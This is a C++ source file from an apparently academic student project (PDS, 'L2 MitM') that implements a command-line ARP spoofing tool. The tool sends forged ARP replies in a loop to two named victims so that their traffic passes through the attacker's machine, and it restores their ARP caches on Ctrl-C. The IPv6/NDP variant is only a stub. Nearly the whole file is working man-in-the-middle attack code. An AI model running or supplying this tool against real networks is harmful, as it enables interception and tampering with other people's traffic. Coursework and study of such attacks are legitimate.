// Projekt: PDS - L2 MitM
// Autor:   Daniel Klimaj; xklima22@stud.fit.vutbr.cz

#include <csignal>
#include <unistd.h>

#include "types.h"
#include "netitf.h"
#include "arppkt.h"
#include "socket.h"
#include "icmpv6pkt.h"

using namespace std;

///
/// \brief Priznak urcujuci, ci sa bude este pokracovat v zasielani paketov,
/// SIGINT ho nastavi na false
///
bool do_spoofing = true;

void print_usage();
void on_sigint(int signum);
bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1,
    MACAddr *m2, uint interval);
bool spoof_ndp(NetItf *itf, IPv6Addr *ip1, IPv6Addr *ip2, MACAddr *m1, MACAddr *m2);

int main(int argc, char **argv)
{
    bool all_ok = true;
    StrVect args;
    for(int i=0; i<argc; ++i)
        args.push_back(string(argv[i]));

    signal(SIGINT, on_sigint);

    string interface   = "";
    string interval    = "";
    string protocol    = "";
    string v1ip        = "";
    string v1mac       = "";
    string v2ip        = "";
    string v2mac       = "";
    uint   tm_interval = 0;

    if(args.size() != 15)
    {
        print_usage();
        return OP_FAIL;
    }

    for(uint i=1; i<args.size(); i += 2) // Preskoc nazov binarky
    {
        if(args[i][0] == '-')
        {
            if     (args[i] == "-i")          interface = args[i+1];
            else if(args[i] == "-t")          interval  = args[i+1];
            else if(args[i] == "-p")          protocol  = args[i+1];
            else if(args[i] == "-victim1ip")  v1ip      = args[i+1];
            else if(args[i] == "-victim1mac") v1mac     = args[i+1];
            else if(args[i] == "-victim2ip")  v2ip      = args[i+1];
            else if(args[i] == "-victim2mac") v2mac     = args[i+1];
            else
            {
                cerr << "Unknown parameter " << args[i] << endl;
                print_usage();
                return OP_FAIL;
            }
        }
        else
        {
            print_usage();
            return OP_FAIL;
        }
    }

    if(protocol != "arp" && protocol != "ndp")
    {
        cerr << "Invalid protocol '" << protocol << "'" << endl;
        all_ok = false;
    }

    size_t ptr;
    tm_interval = stoi(interval, &ptr);
    if(ptr != interval.size())
    {
        cerr << "Invalid interval value '" << interval << "'" << endl;
        all_ok = false;
    }

    NetItf *netitf = new NetItf(interface);
    if(netitf->index() < 0)
    {
        cerr << "Failed to find netinterface '" << interface << "'" << endl;
        all_ok = false;
    }

    IPVer v1ipv = IPAddr::get_version(v1ip);
    IPVer v2ipv = IPAddr::get_version(v2ip);
    if(v1ipv == IPVer::Undef || v2ipv == IPVer::Undef)
    {
        cerr << "Invalid IP address format" << endl;
        all_ok = false;
    }
    if(v1ipv != v2ipv)
    {
        cerr << "Different IP address versions" << endl;
        all_ok = false;
    }

    IPv6Addr *v1ip6  = nullptr;
    IPv6Addr *v2ip6  = nullptr;
    IPv4Addr *v1ip4  = nullptr;
    IPv4Addr *v2ip4  = nullptr;
    MACAddr  *v1maca = nullptr;
    MACAddr  *v2maca = nullptr;

    if(v1ipv == IPVer::IPv4)
    {
        v1ip4 = new IPv4Addr(v1ip);
        v2ip4 = new IPv4Addr(v2ip);
        if(v1ip4->empty())
        {
            cerr << "Invalid IPv4 address: " << v1ip << endl;
            all_ok = false;
        }
        if(v2ip4->empty())
        {
            cerr << "Invalid IPv4 address: " << v2ip << endl;
            all_ok = false;
        }
    }
    else
    {
        v1ip6 = new IPv6Addr(v1ip);
        v2ip6 = new IPv6Addr(v2ip);
        if(v1ip6->empty())
        {
            cerr << "Invalid IPv4 address: " << v1ip << endl;
            all_ok = false;
        }
        if(v2ip6->empty())
        {
            cerr << "Invalid IPv4 address: " << v2ip << endl;
            all_ok = false;
        }
    }

    v1maca = new MACAddr(v1mac);
    v2maca = new MACAddr(v2mac);
    if(v1maca->empty())
    {
        cerr << "Invalid MAC address: " << v1mac << endl;
        all_ok = false;
    }
    if(v2maca->empty())
    {
        cerr << "Invalid MAC address: " << v2mac << endl;
        all_ok = false;
    }

    cout << "Interface: " << interface << endl;
    cout << "Interval:  " << interval << " - " << tm_interval << endl;
    cout << "Protocol:  " << protocol << endl;
    cout << "V1 IP:     " << v1ip << endl;
    cout << "V1 MAC:    " << v1mac << endl;
    cout << "V2 IP:     " << v2ip << endl;
    cout << "v2 MAC:    " << v2mac << endl;

    if(all_ok)
    {
        if(protocol == "arp")
        {
            if(!spoof_arp(netitf, v1ip4, v2ip4, v1maca, v2maca, tm_interval))
                cerr << "ARP spoof failed" << endl;
        }
        else
        {
            if(!spoof_ndp(netitf, v1ip6, v2ip6, v1maca, v2maca))
                cerr << "NDP spoof failed" << endl;
        }
    }

    if(v1ip6 != nullptr) delete v1ip6;
    if(v2ip6 != nullptr) delete v2ip6;
    if(v1ip4 != nullptr) delete v1ip4;
    if(v2ip4 != nullptr) delete v2ip4;
    delete v1maca;
    delete v2maca;
    delete netitf;
    return 0;
}

void print_usage()
{
    cout << "Usage: " << "pds-spoof -i interface -t sec -p protocol " <<
        "-victim1ip ipaddress -victim1mac macaddress -victim2ip " <<
        "ipaddress -victim2mac macaddress" << endl;
}

///
/// \brief SIGINT handler
/// \param signum
///
void on_sigint(int signum)
{
    cout << " SIGINT(" << signum << ") detected" << endl;
    do_spoofing = false;
}

bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1,
MACAddr *m2, uint interval)
{
    Socket s(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(s.open() != SocketStatus::Opened)
    {
        cerr << "Failed to open socket for ARP spoofing" << endl;
        return false;
    }

    MACAddr     *loc_mac  = itf->mac();
    ArpPkt      *arppkt1  = new ArpPkt(ArpType::Response, ip2, loc_mac); // pre V1
    ArpPkt      *arppkt2  = new ArpPkt(ArpType::Response, ip1, loc_mac); // pre V2
    sockaddr_ll  saddr_v4 = arppkt1->sock_addr(itf->index());
    uchar       *data1    = nullptr;
    uchar       *data2    = nullptr;

    arppkt1->set_dst_hwa(m1);
    arppkt1->set_dst_ip_addr(ip1);
    arppkt2->set_dst_hwa(m2);
    arppkt2->set_dst_ip_addr(ip2);
    data1 = arppkt1->serialize();
    data2 = arppkt2->serialize();

    while(do_spoofing)
    {
        cout << "Sending ARP packets" << endl;
        s.send_to(data1, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
            sizeof(saddr_v4));
        s.send_to(data2, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
            sizeof(saddr_v4));
        usleep(interval * 1000);
    }

    arppkt1->set_src_hwa(m2);
    arppkt2->set_src_hwa(m1);
    data1 = arppkt1->serialize();
    data2 = arppkt2->serialize();

    // Obnova povodneho stavu
    cout << "Restoring previous ARP status" << endl;
    s.send_to(data1, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
        sizeof(saddr_v4));
    s.send_to(data2, ArpPkt::LEN, 0, (sockaddr*)&saddr_v4,
        sizeof(saddr_v4));

    s.close();
    delete arppkt1;
    delete arppkt2;
    return true;
}

bool spoof_ndp(NetItf *itf, IPv6Addr *ip1, IPv6Addr *ip2, MACAddr *m1, MACAddr *m2)
{
    cout << "NDP spoof" << endl;
    (void) itf;
    (void) ip1;
    (void) ip2;
    (void) m1;
    (void) m2;
    return false;
}
